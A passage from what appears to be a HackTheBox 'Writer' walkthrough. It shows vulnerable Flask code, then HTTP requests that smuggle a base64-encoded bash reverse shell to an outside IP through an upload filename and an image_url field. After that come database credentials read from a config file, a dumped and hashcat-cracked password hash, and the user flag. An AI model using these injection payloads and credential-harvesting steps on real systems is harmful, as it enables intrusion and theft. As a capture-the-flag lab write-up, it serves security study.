    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM stories where id = %(id)s;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">edit.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/stories/delete/&lt;id&gt;</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">delete_story</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database error</span><span class="sh">"</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">DELETE FROM stories WHERE id = %(id)s;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/stories</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM stories where id = %(id)s;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">:</span> <span class="nb">id</span><span class="p">})</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">delete.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>

<span class="c1">#Define user page for dashboard
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/users</span><span class="sh">'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">users</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="k">return</span> <span class="sh">"</span><span class="s">Database Error</span><span class="sh">"</span>
  <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
  <span class="n">sql_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SELECT * FROM users;</span><span class="sh">"</span>
  <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
  <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">users.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="c1">#Define settings page
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard/settings</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">settings</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
  <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
    <span class="k">return</span> <span class="sh">"</span><span class="s">Database Error!</span><span class="sh">"</span>
  <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
  <span class="n">sql_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">SELECT * FROM site WHERE id = 1</span><span class="sh">"</span>
  <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
  <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
  <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">settings.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>

<span class="c1">#Define authentication mechanism
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/administrative</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login_page</span><span class="p">():</span>
  <span class="nf">if </span><span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/dashboard</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">uname</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">md5</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)).</span><span class="nf">hexdigest</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">connector</span> <span class="o">=</span> <span class="nf">connections</span><span class="p">()</span>
    <span class="k">except</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
      <span class="nf">return </span><span class="p">(</span><span class="sh">"</span><span class="s">Database error</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">cursor</span> <span class="o">=</span> <span class="n">connector</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
      <span class="n">sql_command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Select * From users Where username = </span><span class="sh">'</span><span class="s">%s</span><span class="sh">'</span><span class="s"> And password = </span><span class="sh">'</span><span class="s">%s</span><span class="sh">'"</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
      <span class="n">cursor</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">sql_command</span><span class="p">)</span>
      <span class="n">results</span> <span class="o">=</span> <span class="n">cursor</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
      <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Got result</span><span class="sh">"</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">result</span> <span class="ow">and</span> <span class="nf">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">success.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">results</span><span class="o">=</span><span class="n">results</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Incorrect credentials supplied</span><span class="sh">"</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
      <span class="n">error</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Incorrect credentials supplied</span><span class="sh">"</span>
      <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">login.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/logout</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
  <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">):</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>
  <span class="n">session</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="sh">'</span><span class="s">user</span><span class="sh">'</span><span class="p">)</span>
  <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
  <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>        if request.form.get('image\_url'):
            image\_url = request.form.get('image\_url')
            if ".jpg" in image\_url:
                try:
                    local\_filename, headers = urllib.request.urlretrieve(image\_url)
                    os.system("mv {} {}.jpg".format(local\_filename, local\_filename))
                    image = "{}.jpg".format(local\_filename)
                    try:
                        im = Image.open(image) 
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                    except PIL.UnidentifiedImageError:
                        os.system("rm {}".format(image))
                        error = "Not a valid image file!"
                        return render\_template('add.html', error=error)
                except:
                    error = "Issue uploading picture"
                    return render\_template('add.html', error=error)
            else:
                error = "File extensions must be in .jpg!"
                return render\_template('add.html', error=error)
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/008.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/008.png" alt="" loading="lazy"></a></p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre>POST /dashboard/stories/add HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Ubuntu<span class="p">;</span> Linux x86<span class="se">\_</span>64<span class="p">;</span> rv:91.0<span class="o">)</span> Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="se">\*</span>/<span class="se">\*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">---------------------------4229921975180160461559477084</span>
Content-Length: 905
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: <span class="nv">session</span><span class="o">=</span>eyJ1c2VyIjoiYWRtaW4nIC0tIC0ifQ.YRZmJQ.N6M7slyxhOtSWldWbognlVjbwdo
Upgrade-Insecure-Requests: 1

<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span>

hack
<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"title"</span>

hack
<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"tagline"</span>

hack
<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"image"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"123.jpg;</span><span class="sb">`</span><span class="nb">echo </span><span class="nv">L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash<span class="sb">`</span><span class="s2">"</span>
Content-Type: image/jpeg


<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"image_url"</span>


<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"content"</span>

asdasdasdasd
<span class="nt">-----------------------------4229921975180160461559477084--</span>

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/009.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/009.png" alt="" loading="lazy"></a></p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre>POST /dashboard/stories/add HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Ubuntu<span class="p">;</span> Linux x86<span class="se">\_</span>64<span class="p">;</span> rv:91.0<span class="o">)</span> Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="se">\*</span>/<span class="se">\*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: zh-CN,zh<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,zh-TW<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.7,zh-HK<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5,en-US<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.3,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.2
Accept-Encoding: <span class="nb">gzip</span>, deflate
Content-Type: multipart/form-data<span class="p">;</span> <span class="nv">boundary</span><span class="o">=</span><span class="nt">---------------------------4229921975180160461559477084</span>
Content-Length: 959
Origin: http://writer.htb
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: <span class="nv">session</span><span class="o">=</span>eyJ1c2VyIjoiYWRtaW4nIC0tIC0ifQ.YRZmJQ.N6M7slyxhOtSWldWbognlVjbwdo
Upgrade-Insecure-Requests: 1

<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span>

hack
<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"title"</span>

hack
<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"tagline"</span>

hack
<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"image"</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">"123.jpg"</span>
Content-Type: image/jpeg


<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"image_url"</span>

file:///var/www/writer.htb/writer/static/img/123.jpg<span class="p">;</span><span class="sb">`</span><span class="nb">echo </span><span class="nv">L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjQvMTAwODYgMD4mMSI</span><span class="o">=</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash<span class="sb">`</span>

<span class="nt">-----------------------------4229921975180160461559477084</span>
Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"content"</span>

asdasdasdasd
<span class="nt">-----------------------------4229921975180160461559477084--</span>

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/010.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/010.png" alt="" loading="lazy"></a></p>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>www-data@writer:/<span class="nv">$ </span><span class="nb">ls</span> /home
<span class="nb">ls</span> /home
john
kyle
www-data@writer:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /home/kyle
<span class="nb">ls</span> <span class="nt">-al</span> /home/kyle
total 28
drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 <span class="nb">.</span>
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 18 18:03 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 kyle kyle  220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 kyle kyle 3771 Feb 25  2020 .bashrc
drwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache
<span class="nt">-rw-r--r--</span> 1 kyle kyle  807 Feb 25  2020 .profile
<span class="nt">-r--------</span> 1 kyle kyle   33 Aug 14 08:32 user.txt
www-data@writer:/var/www/writer2_project/writerv2<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>                                                                                                                                                          
<span class="nb">ls</span> <span class="nt">-al</span>                                                                                                                                                                                                             
total 24                                                                                                                                                                                                           
dr-xr-sr-x 3 www-data smbgroup 4096 May 19 12:32 <span class="nb">.</span>                                                                                                                                                                 
drwxrws--- 6 www-data smbgroup 4096 Aug  2 06:52 ..                                                                                                                                                                
<span class="nt">-r-xr-s---</span> 1 www-data smbgroup    0 Aug 14 08:56 __init__.py                                                                                                                                                       
dr-xr-s--- 2 www-data smbgroup 4096 May 19 21:06 __pycache__                                                                                                                                                       
<span class="nt">-r-xr-s---</span> 1 www-data smbgroup 3307 Aug 14 08:56 settings.py                                                                                                                                                       
<span class="nt">-r-xr-s---</span> 1 www-data smbgroup  817 Aug 14 08:56 urls.py                                                                                                                                                           
<span class="nt">-r-xr-s---</span> 1 www-data smbgroup  401 Aug 14 08:56 wsgi.py

</pre></td></tr></tbody></table></code></div></div>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>DATABASES <span class="o">=</span> <span class="o">{</span>                                                                                                                                                                                                      
    <span class="s1">'default'</span>: <span class="o">{</span>                                                                                                                                                                                                   
      <span class="s1">'ENGINE'</span>: <span class="s1">'django.db.backends.mysql'</span>,                                                                                                                                                                      
      <span class="s1">'OPTIONS'</span>: <span class="o">{</span>                                                                                                                                                                                               
      <span class="s1">'read\_default\_file'</span>: <span class="s1">'/etc/mysql/my.cnf'</span>,                                                                                                                                                              
    <span class="o">}</span>,
  <span class="o">}</span>
<span class="o">}</span>

</pre></td></tr></tbody></table></code></div></div>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="o">[</span>client]
database <span class="o">=</span> dev
user <span class="o">=</span> djangouser
password <span class="o">=</span> DjangoSuperPassword
default-character-set <span class="o">=</span> utf8

</pre></td></tr></tbody></table></code></div></div>

<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>MariaDB <span class="o">[</span>dev]&gt; <span class="k">select </span>username,password from auth_user<span class="p">;</span>
<span class="k">select </span>username,password from auth_user<span class="p">;</span>
+----------+------------------------------------------------------------------------------------------+
| username | password                                                                                 |
+----------+------------------------------------------------------------------------------------------+
| kyle     | pbkdf2_sha256<span class="nv">$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A</span><span class="o">=</span> |
+----------+------------------------------------------------------------------------------------------+
1 row <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>

</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/HTB-Writer/011.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/011.png" alt="" loading="lazy"></a></p>

<p><a href="/assets/img/HTB-Writer/012.png" class="popup img-link  shimmer"><img src="/assets/img/HTB-Writer/012.png" alt="" loading="lazy"></a></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>PS E:\tools\hashcat-5.1.0&gt; hashcat64.exe .\hash.txt .\rockyou.txt -m 10000 --show
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio

</pre></td></tr></tbody></table></code></div></div>
<div class="language-shell highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>kyle@writer:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
total 28
drwxr-xr-x 3 kyle kyle 4096 Aug  5 09:59 <span class="nb">.</span>
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 18 18:03 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 kyle kyle  220 Feb 25  2020 .bash_logout
<span class="nt">-rw-r--r--</span> 1 kyle kyle 3771 Feb 25  2020 .bashrc
drwx------ 2 kyle kyle 4096 Jul 28 09:03 .cache
<span class="nt">-rw-r--r--</span> 1 kyle kyle  807 Feb 25  2020 .profile
<span class="nt">-r--------</span> 1 kyle kyle   33 Aug 13 12:20 user.txt
kyle@writer:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
a90cca8b34ddad84ad5f93fae43fe8d1

</pre></td></tr></tbody></table></code></div></div>
<h3 id="privilege-escalation"><span class="me-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
